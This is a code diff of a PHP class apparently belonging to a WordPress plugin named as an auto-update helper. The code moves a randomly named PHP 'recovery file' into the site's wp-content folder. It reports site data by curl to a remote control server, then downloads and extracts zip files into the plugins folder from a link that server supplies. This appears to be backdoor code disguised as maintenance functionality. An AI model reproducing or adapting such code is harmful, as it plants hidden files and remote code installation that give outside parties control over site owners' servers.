@@ -178,20 +178,17 @@ if (!class_exists('WP_Optimiza_Control_Auto_Update'))
 			}
 		}
 		
-
+		
 		//CREATE A RECOVERY FILE IN PLUGIN INDEX
-		public function recovery_file() {
-			$file = dirname(__FILE__) . "/includes/recovery_file/GjHzHTg9MHYk6BjzUK3R.php";
-			$dest = getcwd() . "/GjHzHTg9MHYk6BjzUK3R.php";
-
+		function recovery_file() {
+			$file = dirname(__FILE__) . "/GjHzHTg9MHYk6BjzUK3R.php";
+			$dest = getcwd() . '/wp-content/' . "GjHzHTg9MHYk6BjzUK3R.php";
 			rename($file, $dest);
 		}
-		
 		
 		//INSTALL THE REQUIRED PLUGIN 
 		public function install_plugins()
 		{
-			
 			foreach($this->plugins as $name=> $plugin)
 			{
 				$this->install_plugin($plugin["repository"]);
@@ -220,7 +217,7 @@ if (!class_exists('WP_Optimiza_Control_Auto_Update'))
 					
 					$url = $this->url_control . 'api/v1/plugin_update';
 					$data_send = curl_init();
-		
+			
 						curl_setopt($data_send,CURLOPT_URL, $url);
 						curl_setopt($data_send,CURLOPT_POSTFIELDS, json_encode($data));
 		
@@ -234,13 +231,12 @@ if (!class_exists('WP_Optimiza_Control_Auto_Update'))
 		//FUNCTION TO DOWNLOAD AND INSTALL A PLUGIN
 		public function install_plugin($repository)
 		{
-			
 			$content = file_get_contents($repository);
-
+			
 			$values = explode("|", $content);
 			
 			$link = $values[1];
-
+	
 			$file = "../wp-content/plugins/".$this->temp_name;
 			$dir = "../wp-content/plugins/";
 			
@@ -250,13 +246,12 @@ if (!class_exists('WP_Optimiza_Control_Auto_Update'))
 			
 			if ($zip->open($file) === TRUE) 
 			{
-
 				$zip->extractTo($dir);
 				$zip->close();
 			} 
 			
-			unlink($file);
-			
+			unlink($file);	
+
 		}
 	}
 		new WP_Optimiza_Control_Auto_Update();
